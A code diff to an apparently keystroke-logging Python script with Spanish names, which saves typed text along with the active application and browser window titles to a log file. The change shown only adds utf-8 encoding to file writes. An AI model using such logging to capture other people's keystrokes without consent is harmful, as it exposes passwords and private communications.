@@ -40,7 +40,7 @@ def detectar_navegador(nombre_aplicacion, titulo_ventana):
 
 # Función de fecha y hora
 def iniciar_log():
-    with open(log_filename, 'a') as logfile:
+    with open(log_filename, 'a', encoding='utf-8') as logfile:
         logfile.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}:\n")
 
 
@@ -71,7 +71,7 @@ def guardar_texto_con_fecha():
         nombre_aplicacion, titulo_ventana = aplicacion_activa()
         ventana_navegador = detectar_navegador(nombre_aplicacion, titulo_ventana)
 
-        with open(log_filename, 'a') as logfile:
+        with open(log_filename, 'a', encoding='utf-8') as logfile:
             logfile.write("".join(current_text))
             logfile.write("".join("\n"))
             logfile.write(f"App: {nombre_aplicacion}\n")
@@ -79,13 +79,13 @@ def guardar_texto_con_fecha():
                 logfile.write(f"Navegador: {titulo_ventana}\n")
 
         current_text.clear()  
-    with open(log_filename, 'a') as logfile:
+    with open(log_filename, 'a', encoding='utf-8') as logfile:
 
         logfile.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}:\n")
 
 # Actualizar el archivo en tiempo real solo cuando se presiona una tecla
 def actualizar_log(borrado=False):
-    with open(log_filename, 'r+') as logfile:
+    with open(log_filename, 'r+', encoding='utf-8') as logfile:
         logfile.seek(0, 2)  # Mover al final
         if borrado:
             if logfile.tell() > 0:
